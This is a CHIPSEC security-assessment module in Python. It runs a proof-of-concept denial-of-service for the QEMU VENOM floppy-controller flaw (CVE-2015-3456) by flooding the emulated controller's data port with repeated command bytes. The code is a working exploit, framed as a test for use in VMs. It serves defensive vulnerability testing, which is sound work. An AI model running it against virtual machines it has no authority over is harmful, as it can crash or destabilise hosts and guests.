# CHIPSEC: Platform Security Assessment Framework
# Copyright (c) 2010-2020, Intel Corporation
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; Version 2.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
# Contact information:
# chipsec@intel.com
#


"""
QEMU VENOM vulnerability DoS PoC test

Reference:
    - Module is based on `PoC by Marcus Meissner <https://marc.info/?l=oss-security&m=143155206320935&w=2>`_
    - `VENOM: QEMU vulnerability (CVE-2015-3456) <https://access.redhat.com/articles/1444903>`_

Usage:
    ``chipsec_main.py -i -m tools.vmm.venom``

Examples:
    >>> chipsec_main.py -i -m tools.vmm.venom

Additional options set within the module:
    - ``ITER_COUNT``         : Iteration count
    - ``FDC_PORT_DATA_FIFO`` : FDC DATA FIFO port
    - ``FDC_CMD_WRVAL``      : FDC Command write value
    - ``FD_CMD``             : FD Command

.. note::
    - Returns a Warning by default
    - System may be in an unknown state, further evaluation may be needed

.. important::
    - This module is designed to run in a VM environment
    - Behavior on physical HW is undefined

"""

from chipsec.module_common import BaseModule
from chipsec.library.returncode import ModuleResult

_MODULE_NAME = 'venom'

ITER_COUNT = 0x10000000
FDC_PORT_DATA_FIFO = 0x3F5
FDC_CMD_WRVAL = 0x42
FD_CMD = 0x8E  # FD_CMD_DRIVE_SPECIFICATION_COMMAND # FD_CMD_READ_ID = 0x0A


class venom (BaseModule):
    def __init__(self):
        BaseModule.__init__(self)

    def venom_impl(self):
        self.cs.io.write_port_byte(FDC_PORT_DATA_FIFO, FD_CMD)
        for _ in range(ITER_COUNT):
            self.cs.io.write_port_byte(FDC_PORT_DATA_FIFO, FDC_CMD_WRVAL)
        return True

    def run(self, module_argv):
        self.logger.start_test('QEMU VENOM vulnerability DoS PoC')

        self.venom_impl()

        self.logger.log_information('Module completed')
        self.logger.log_warning('System may be in an unknown state, further evaluation may be needed.')
        self.result.setStatusBit(self.result.status.VERIFY)
        self.res = self.result.getReturnCode(ModuleResult.WARNING)
        return self.res
